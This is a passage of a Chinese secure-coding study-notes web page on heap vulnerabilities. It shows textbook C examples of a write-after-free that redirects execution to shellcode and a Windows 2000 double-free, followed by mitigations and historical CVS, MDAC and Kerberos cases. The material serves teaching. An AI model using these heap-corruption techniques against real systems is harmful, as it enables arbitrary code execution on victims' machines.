+<a id="__codelineno-15-8" name="__codelineno-15-8"></a><a href="#__codelineno-15-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-9" name="__codelineno-15-9"></a><a href="#__codelineno-15-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-10" name="__codelineno-15-10"></a><a href="#__codelineno-15-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-15-11" name="__codelineno-15-11"></a><a href="#__codelineno-15-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Punalloc</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">     </span><span class="c1">//(1)</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="hll"><a href="#__codelineno-15-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h1</span><span class="p">);</span><span class="w">                                    </span><span class="c1">//(2)</span>
+</span><a id="__codelineno-15-13" name="__codelineno-15-13"></a><span class="hll"><a href="#__codelineno-15-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="mh">0x042B17C</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w">                        </span><span class="c1">//(3)</span>
+</span><a id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="hll"><a href="#__codelineno-15-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">h1</span><span class="o">-&gt;</span><span class="n">bp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
+</span><a id="__codelineno-15-15" name="__codelineno-15-15"></a><a href="#__codelineno-15-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">               </span><span class="c1">//(4)</span>
+<a id="__codelineno-15-16" name="__codelineno-15-16"></a><a href="#__codelineno-15-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">);</span><span class="w">                                    </span><span class="c1">//(5)</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17"></a><a href="#__codelineno-15-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-18" name="__codelineno-15-18"></a><a href="#__codelineno-15-18"><span class="linenos" data-linenos="18 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>从该堆中分配了一个<code>32</code>字节的内存块，用<code>h1</code>表示</li>
+<li>“错误地”释放</li>
+<li>用户数据则被错误地写入已释放内存块中</li>
+<li>对<code>HeapAlloc()</code>的调用使得<code>HeapFree()</code>的地址被shellcode的地址所覆盖</li>
+<li>控制权转移到shellcode</li>
+</ol>
+</li>
+<li>
+<p>双重释放</p>
+<div class="highlight"><span class="filename">基于Windows 2000漏洞</span><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a><a href="#__codelineno-16-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-16-2" name="__codelineno-16-2"></a><a href="#__codelineno-16-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-16-3" name="__codelineno-16-3"></a><a href="#__codelineno-16-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">h4</span><span class="p">,</span><span class="w"> </span><span class="n">h5</span><span class="p">,</span><span class="w"> </span><span class="n">h6</span><span class="p">,</span><span class="w"> </span><span class="n">h7</span><span class="p">,</span><span class="w"> </span><span class="n">h8</span><span class="p">,</span><span class="w"> </span><span class="n">h9</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-16-4" name="__codelineno-16-4"></a><a href="#__codelineno-16-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-5" name="__codelineno-16-5"></a><a href="#__codelineno-16-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-6" name="__codelineno-16-6"></a><a href="#__codelineno-16-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-7" name="__codelineno-16-7"></a><a href="#__codelineno-16-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-8" name="__codelineno-16-8"></a><a href="#__codelineno-16-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;b&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-9" name="__codelineno-16-9"></a><a href="#__codelineno-16-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">h3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-10" name="__codelineno-16-10"></a><a href="#__codelineno-16-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;c&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-11" name="__codelineno-16-11"></a><a href="#__codelineno-16-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-12" name="__codelineno-16-12"></a><a href="#__codelineno-16-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">h4</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-13" name="__codelineno-16-13"></a><a href="#__codelineno-16-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">h5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-16-14" name="__codelineno-16-14"></a><a href="#__codelineno-16-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">h5</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-15" name="__codelineno-16-15"></a><a href="#__codelineno-16-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-16" name="__codelineno-16-16"></a><span class="hll"><a href="#__codelineno-16-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-16-17" name="__codelineno-16-17"></a><span class="hll"><a href="#__codelineno-16-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-16-18" name="__codelineno-16-18"></a><a href="#__codelineno-16-18"><span class="linenos" data-linenos="18 "></span></a><span class="w">    </span><span class="n">h6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-19" name="__codelineno-16-19"></a><a href="#__codelineno-16-19"><span class="linenos" data-linenos="19 "></span></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">h6</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-20" name="__codelineno-16-20"></a><a href="#__codelineno-16-20"><span class="linenos" data-linenos="20 "></span></a><span class="w">    </span><span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">h4</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-21" name="__codelineno-16-21"></a><a href="#__codelineno-16-21"><span class="linenos" data-linenos="21 "></span></a><span class="w">    </span><span class="n">h7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-22" name="__codelineno-16-22"></a><a href="#__codelineno-16-22"><span class="linenos" data-linenos="22 "></span></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Never gets here.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-16-23" name="__codelineno-16-23"></a><a href="#__codelineno-16-23"><span class="linenos" data-linenos="23 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="_8">缓解漏洞：空指针<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ul>
+<li>完成对<code>free()</code>的调用后，将指针置为NULL</li>
+<li>可以解决写已释放内存，双重释放漏洞问题<ul>
+<li>但是两个异名指针指向同一结构，避免不了问题</li>
+</ul>
+</li>
+<li>一致的内存管理约定<ul>
+<li>使用同样的模式分配和释放内存</li>
+<li>在同一个模块中，在同一个抽象层次中，分配和释放内存</li>
+<li>让分配和释放配对</li>
+</ul>
+</li>
+<li>堆完整性检测<ul>
+<li>canary：“随机值”，当一个内存块被归还时，canary的值会与该内存块被分配时所计算的校验和作比较</li>
+<li>PhkMalloc：检测所有不是由<code>malloc()</code>或<code>realloc()</code>返回的值<ul>
+<li>所以可以检测所有的双重释放错误，一旦检测到错误，会调用<code>abort()</code>（启用A或abort选项）</li>
+<li>增加J(Junk:<code>0xd0</code>)、Z(Zero)选项，会给分配的区域内填充数据</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>随机化<ul>
+<li><code>malloc()</code>返回地址一定程度上可以预测</li>
+<li>使对基于堆的漏洞利用变得更加困难</li>
+</ul>
+</li>
+<li>哨位页<ul>
+<li>是未映射的，被放置到已分配内存（一个页或更大）之间的空间</li>
+<li>当攻击者在利用缓冲区溢出哨位页时，程序会引发段故障</li>
+<li>开销大</li>
+</ul>
+</li>
+<li>运行时分析<ul>
+<li>工具：Purify、Dmalloc库、Electric Fence、GNU checker、Valgrind、Insure++、Application Verifier(MS)</li>
+</ul>
+</li>
+<li>实例<ul>
+<li>Windows XP SP2：canary<ul>
+<li>每一个内存块的末尾增加了一个8位的canary</li>
+<li>空闲链表管理代码中加入更多的检查，其包括三个双链表中未分配的内存块<ul>
+<li>防止flink和blink被恶意修改</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CVS<ul>
+<li>off-by-one缓冲区溢出漏洞<ul>
+<li>当CVS处理一个入口行时，会为该入口行分配了一个多余的内存字节，用来表示其是已修改的还是未修改的，CVS并不会检查是否已经为这个标志分配了内存</li>
+<li>通过多次调用一个有漏洞的函数并且向入口行内插入特殊的字符，远程攻击者就能够覆写多个内存块</li>
+</ul>
+</li>
+<li>服务器双重释放漏洞<ul>
+<li>该漏洞允许远程攻击者执行任意的代码或命令，或者导致一个有漏洞的系统发生拒绝服务</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>微软数据访问组件：缓冲区溢出漏洞<ul>
+<li>如果RDS被启用了，攻击者就可以在IIS服务器上执行任意代码</li>
+<li>建立一个恶意的Web站点，并且发布一个页面，该页面可以通过一个客户端程序（如IE），来利用MDAC RDS存根中的缓冲区溢出</li>
+<li>运行IE的系统容易遭受此攻击</li>
+</ul>
+</li>
+<li>Kerberos 5<ul>
+<li>在krb5-1.3.2以前的发行版的<code>krb5_rd_cred()</code>实现中，包含有显式释放“由ASN.1 解码器函数<code>decode_krb5_enc_cred_part()</code>所返回的”缓冲区的代码<ul>
+<li>发生错误时，解码器自身也会释放该缓冲区 → double free</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p>首先，约会n个女孩；然后，约会更多的女孩，但是娶比之前n个女孩都好的那个；最后停止约会；如果你能一共约会2n个女孩的话，那么只有很小的概率，你会和最差的女孩结婚&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年4月7日 19:02:45</span>
+      
+        <br>
+        创建日期:
+        <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2021年11月4日 16:44:46</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+              
+
+<!-- Giscus -->
+<h2 id="__comments">评论</h2>
+<!-- Replace with generated snippet -->
+<script src="https://giscus.app/client.js"
+        data-repo="jasonren0403/notes"
+        data-repo-id="R_kgDOGXfwBg"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOGXfwBs4CQ0RQ"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+<!-- Synchronize Giscus theme with palette -->
+<script>
+  var giscus = document.querySelector("script[src*=giscus]")
+
+  /* Set palette on initial load */
+  var palette = __md_get("__palette")
+  if (palette && typeof palette.color === "object") {
+    var theme = palette.color.scheme === "slate" ? "dark" : "light"
+    giscus.setAttribute("data-theme", theme) // (1)!
+  }
+
+  /* Register event handlers after documented loaded */
+  document.addEventListener("DOMContentLoaded", function() {
+    var ref = document.querySelector("[data-md-component=palette]")
+    ref.addEventListener("change", function() {
+      var palette = __md_get("__palette")
+      if (palette && typeof palette.color === "object") {
+        var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+        /* Instruct Giscus to change theme */
+        var frame = document.querySelector(".giscus-frame")
+        frame.contentWindow.postMessage(
+                { giscus: { setConfig: { theme } } },
+                "https://giscus.app"
+        )
+      }
+    })
+  })
+</script>
+
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="pointer.html" class="md-footer__link md-footer__link--prev" aria-label="上一页: 指针安全" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              指针安全
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="integer-security.html" class="md-footer__link md-footer__link--next" aria-label="下一页: 整数安全" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              整数安全
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      copyright &copy; (<a href="https://www.jason0743.space" target="_blank">Jason Ren 2019-2022</a>) . All rights reserved，<a href="#__consent">在这里改变 Cookie 设置</a>
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    <a href="https://github.com/jasonren0403" target="_blank" rel="noopener" title="Jason&#39;s Github" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+    </a>
+  
+    
+    
+    <a href="https://twitter.com/theRealRev270" target="_blank" rel="noopener" title="J.R on twitter" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+    <a href="https://www.facebook.com/renjason1999" target="_blank" rel="noopener" title="My facebook page" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+    </a>
+  
+    
+    
+    <a href="https://discord.gg/s33UBWEPxb" target="_blank" rel="noopener" title="Join to my discussion(discord)" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.1.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485.065 485.065 0 0 0 404.081 32.03a1.816 1.816 0 0 0-1.923.91 337.461 337.461 0 0 0-14.9 30.6 447.848 447.848 0 0 0-134.426 0 309.541 309.541 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.689 483.689 0 0 0-119.688 37.107 1.712 1.712 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.016 2.016 0 0 0 .765 1.375 487.666 487.666 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348.2 348.2 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321.173 321.173 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251.047 251.047 0 0 0 9.109-7.137 1.819 1.819 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.812 1.812 0 0 1 1.924.233 234.533 234.533 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.407 301.407 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391.055 391.055 0 0 0 30.014 48.815 1.864 1.864 0 0 0 2.063.7A486.048 486.048 0 0 0 610.7 405.729a1.882 1.882 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541ZM222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241Zm195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241Z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-consent" data-md-component="consent" id="__consent" hidden>
+        <div class="md-consent__overlay"></div>
+        <aside class="md-consent__inner">
+          <form class="md-consent__form md-grid md-typeset" name="consent">
+            
+
+
+
+
+  
+
+<h4>Cookie 约定</h4>
+<p>嗨，欢迎光临JasonRen的笔记小站！此站将使用 Cookie 优化您的体验。关于 Cookie 的具体约定，请访问我的网站。</p>
+<input type="checkbox" class="md-toggle" id="__settings">
+<div class="md-consent__settings">
+  <ul class="task-list">
+    
+  </ul>
+</div>
+<div class="md-consent__controls">
+  
+    
+      <button class="md-button md-button--primary">同意</button>
+    
+    
+    
+  
+    
+    
+    
+      <label class="md-button" for="__settings">管理设定</label>
+    
+  
+</div>
+          </form>
+        </aside>
+      </div>
+      <script>var consent=__md_get("__consent");if(consent)for(var input of document.forms.consent.elements)input.name&&(input.checked=consent[input.name]||!1);else"file:"!==location.protocol&&setTimeout(function(){document.querySelector("[data-md-component=consent]").hidden=!1},250);var action,form=document.forms.consent;for(action of["submit","reset"])form.addEventListener(action,function(e){if(e.preventDefault(),"reset"===e.type)for(var n of document.forms.consent.elements)n.name&&(n.checked=!1);console.log(new FormData(form)),__md_set("__consent",Object.fromEntries(Array.from(new FormData(form).keys()).map(function(e){return[e,!0]}))),location.hash="",location.reload()})</script>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.expand", "navigation.tracking", "navigation.instant", "header.autohide", "toc.integrate", "announce.dismiss", "search.suggest", "search.highlight", "search.share", "content.code.annotate"], "search": "../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": 